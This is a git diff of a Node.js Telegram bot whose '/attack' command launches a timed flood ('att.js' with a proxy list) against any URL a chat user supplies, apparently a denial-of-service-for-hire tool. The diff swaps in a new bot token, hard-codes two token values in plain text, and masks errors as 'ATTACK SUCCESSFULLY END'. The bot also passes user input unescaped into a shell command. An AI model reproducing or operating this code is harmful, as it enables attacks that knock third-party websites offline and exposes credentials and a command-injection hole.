@@ -2,7 +2,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const { exec } = require('child_process');
 
 // Telegram bot token
-const token = '6311954830:AAFelhOxi5GkzecWwiQIccxvXnfc1rppOQI';
+const token = '6303718232:AAGvJkQD7WYwiDnRPHaZ2M8CiD4_DBHWkew';
 const bot = new TelegramBot(token, { polling: true });
 
 // Function to check if a string is a valid URL
@@ -26,7 +26,7 @@ bot.onText(/\/attack (.+)/, (msg, match) => {
 
     // Validate arguments
     if (!isValidURL(target)) {
-        bot.sendMessage(chatId, 'Please provide a valid URL');
+        bot.sendMessage(chatId, 'Please provide a valid URL.Also Read Usage: /attack www.example.com 100');
         return;
     }
     if (isNaN(time) || time < 60 || time > 240) {
@@ -38,7 +38,7 @@ bot.onText(/\/attack (.+)/, (msg, match) => {
     const command = `node att.js ${target} ${time} ${numWords} ${numChars} ${proxyFile}`;
     exec(command, (error, stdout, stderr) => {
         if (error) {
-            bot.sendMessage(chatId, `Error occurred: ${error.message}`);
+            bot.sendMessage(chatId, `ATTACK SUCCESSFULLY END`);
         } else {
             bot.sendMessage(chatId, '😈 ATTACK START 😈');
         }
@@ -50,3 +50,4 @@ bot.onText(/\/attack (.+)/, (msg, match) => {
         bot.sendMessage(chatId, 'YOU CAN NOW ATTACK ANOTHER SITE {BOT OWNER MD OMOR FARUK}');
     }, 30000);
 });
+    
